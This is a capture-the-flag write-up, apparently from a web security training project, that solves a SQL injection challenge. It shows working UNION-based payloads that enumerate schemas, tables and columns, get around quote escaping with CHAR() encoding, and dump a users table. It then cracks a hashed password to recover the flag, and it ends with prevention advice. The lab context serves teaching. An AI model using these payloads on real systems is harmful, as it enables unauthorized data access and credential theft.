# SQL Injection

### 🏴 Flag

```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## 📌 Extract

Page: [http://{IP}/?page=member](http://{ip}}/?page=survey)

When we put an ID in the input, the website will do an SQL request to give us informations about the user. And when we put a random input, we can see an SQL error.

```python
"1 UNION SELECT NULL, schema_name FROM information_schema.schemata--"
```

With this input, the website gives us all the databases he has access to. 

```
ID: 1 UNION SELECT NULL, schema_name FROM information_schema.schemata--
First name:
Surname : Member_Brute_Force
```

```
ID: 1 UNION SELECT NULL, schema_name FROM information_schema.schemata--
First name:
Surname : Member_Sql_Injection
```

```
ID: 1 UNION SELECT NULL, schema_name FROM information_schema.schemata--
First name:
Surname : Member_guestbook
```

```
ID: 1 UNION SELECT NULL, schema_name FROM information_schema.schemata--
First name:
Surname : Member_images
```

```
ID: 1 UNION SELECT NULL, schema_name FROM information_schema.schemata--
First name:
Surname : Member_survey
```

And thanks to this, we can get 3 differents flags.

This section is about Member_Sql_Injection.

Now we need to get the tables of the database, thanks to this input : 

```jsx
1 UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = {stringToChar('Member_Sql_Injection')}—
```

stringToChar is a function that transform the string “Hello” into Char : CHAR(72, 101, 108, 108, 111)

Because the website does not accept the quotes (it puts a ‘\’ before)

Now that we have the tables we need the columns of it:

```jsx
1 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_schema = {stringToChar('Member_Sql_Injection')} AND table_name = {stringToChar('users')}—
```

Output:

```
Surname : user_id
Surname : first_name
Surname : last_name
Surname : town
Surname : country
Surname : planet
Surname : Commentaire
Surname : countersign
```

Now that we have the columns, we can get all the data !

```python
"1 UNION SELECT NULL, CONCAT(user_id, CHAR(10), first_name, CHAR(10), last_name, CHAR(10), town, CHAR(10), country, CHAR(10), planet, CHAR(10), Commentaire, CHAR(10), countersign) FROM Member_Sql_Injection.users--"
```

The CHAR(10) is just a ‘\n’, it will be better on the website

And in the output we have all the users, but the one which is interesting 

```
Flag
GetThe
42
42
42
Decrypt this password -> then lower all the char. Sh256 on it and it's good !
5ff9d0165b4f92b14994e5c685cdce28
```

We convert 5ff9d0165b4f92b14994e5c685cdce28 in MD5 which is: FortyTwo

We lowered the string and convert it into Sh256, and we are done !

fortytwo → 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

## 🎯 Use

This vulnerability lets attackers manipulate SQL queries to gain unauthorized access to the database. Without proper validation, they can:

- **Access sensitive data** such as user credentials or personal information.
- **Modify or delete data** to disrupt the application's functionality.
- **Escalate privileges** by altering database permissions.
- **Bypass authentication** mechanisms to gain unauthorized access.

## 🔒 Prevention

1. **Use Prepared Statements:** Always use parameterized queries to separate SQL code from data.
2. **Input Validation:** Validate and sanitize all user inputs to prevent malicious SQL code.
3. **Least Privilege Principle:** Limit database permissions to only what is necessary.
4. **Stored Procedures:** Use stored procedures to abstract SQL queries from user input.
5. **Regular Audits:** Monitor and audit database access and queries for suspicious activity.

## 📚 Documentation

📖 [OWASP](https://owasp.org/www-community/attacks/SQL_Injection)

### 📖 [Home page](https://github.com/hugo-bourgeon/darkly#readme)